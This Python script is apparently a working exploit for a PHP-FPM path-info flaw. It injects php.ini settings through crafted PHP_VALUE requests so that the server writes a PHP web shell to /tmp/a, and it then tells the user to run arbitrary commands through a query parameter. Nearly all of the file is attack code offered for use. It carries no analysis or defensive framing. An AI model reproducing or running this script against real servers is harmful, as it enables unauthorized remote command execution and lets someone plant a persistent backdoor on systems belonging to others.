import argparse
from urllib.parse import urlparse
from detect import detect,DoRequestAttack

parser = argparse.ArgumentParser()
parser.add_argument("-u", help="url to detect")
args = parser.parse_args()
url = args.u 

checkCommand   = "a=/bin/sh+-c+'which+which'&" # must not contain any chars that are encoded (except space)
successPattern = "/bin/which"
cleanupCommand = ";echo '<?php echo `$_GET[a]`;return;?>'>/tmp/a;which which"
cleanupCommand = "%3Becho+%27%3C%3Fphp+echo+%60%24_GET%5Ba%5D%60%3Breturn%3B%3F%3E%27%3E%2Ftmp%2Fa%3Bwhich+which&"

php_settings = {
    "short_open_tag=1;;;;;;;":"short_open_tag=1;;;;;;;",# default On
    "html_errors=0;;;;;;;;;;":"html_errors=0;;;;;;;;;;",# default On
    "include_path=/tmp;;;;;;":"include_path=/tmp;;;;;;",# default .:/usr/local/lib/php
    "auto_prepend_file=a;;;;":"auto_prepend_file=a;;;;",# default null
    "log_errors=1;;;;;;;;;;;":"log_errors=1;;;;;;;;;;;",# default Off
    "error_reporting=2;;;;;;":"error_reporting=2;;;;;;",# default null
    "error_log=/tmp/a;;;;;;;":"error_log=/tmp/a;;;;;;;",# default null
    "extension_dir=\"<?=`\";;;":"extension_dir=%22%3C%3F=%60%22;;;",
    "extension=\"$_GET[a]`?>\"":"extension=%22$_GET%5Ba%5D%60%3F%3E%22",
}


def main():
    url_parsed = urlparse(url)
    if url_parsed.path == "":
        print("ERROR: Please input correct URL whit path(example /index.php)") 
        return

    QueryStringLength,PisosLength = detect(url)

    print("Start attack!")
    SuccessFlag = False
    for i in range(20):
        for ori,dec in php_settings.items():
            pathInfo = "/PHP_VALUE\n"+ori
            u_path = "/index.php"+"/PHP_VALUE%0A"+dec
            r_u_path = "/index.php"
            qslDelta = len(u_path) - len(pathInfo) - len(r_u_path)

            payload = url+"/PHP_VALUE%0A"+dec+"?"+checkCommand+"Q"*(QueryStringLength-len(checkCommand)-qslDelta//2)
            _, content = DoRequestAttack(payload, PisosLength)

            if successPattern in content:
                print("Exploited! use \"?a=/usr/bin/yourcommand\" ")
                SuccessFlag = True
                break
        break

    if not SuccessFlag:
        print("Exploite Failed!")
        exit(0)

    print("Clean up /tmp/a...")
    for i in range(5):
        payload = url+"/?a="+cleanupCommand+"Q"*(QueryStringLength-len(cleanupCommand)-2)
        _, content = DoRequestAttack(payload, PisosLength)

        if successPattern in content:
            print("Done")

if __name__ == '__main__':
    main()
